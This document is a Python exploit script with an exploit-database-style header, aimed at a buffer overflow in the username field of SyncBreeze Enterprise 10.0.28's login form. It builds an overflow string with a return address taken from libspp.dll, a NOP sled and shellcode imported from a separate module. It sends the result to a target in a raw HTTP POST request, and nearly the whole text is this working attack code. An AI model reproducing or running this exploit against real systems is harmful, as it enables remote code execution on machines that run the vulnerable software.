# Exploit Title: [SyncBreeze POST username overflow]
# Date: [30-Sep-2017]
# Exploit Author: [Owais Mehtab]
# Vendor Homepage: [http://www.syncbreeze.com]
# Software Link: [http://www.syncbreeze.com/setups/syncbreezeent_setup_v10.0.28.exe]
# Version: [10.0.28]
# Tested on: [Windows 7]

#!/usr/bin/python
#!/usr/bin/python

import socket
from payload import buf

import struct
def shell_attack(target_machine, target_port):

    crash = "A" * 1000
    # jmp = 10 09 0c 83 libspp.dll
    # bad char = 00 0A 0D 25 26 2B 3D


   


    crash = "A" * 780 + "\x83\x0c\x09\x10" + "\x90"*16 + str(buf)

    fuzz="username="+crash+"&password=A"

    buffer="POST /login HTTP/1.1\r\n"
    buffer+="Host: "+target_machine+"\r\n"
    buffer+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
    buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer+="Accept-Language: en-US,en;q=0.5\r\n"
    buffer+="Referer: http://"+target_machine+"/login\r\n"
    buffer+="Connection: close\r\n"
    buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
    buffer+="Content-Length: "+str(len(fuzz))+"\r\n"
    buffer+="\r\n"
    buffer+=fuzz

    expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    expl.connect((target_machine, target_port))
    expl.send(buffer)
    expl.close()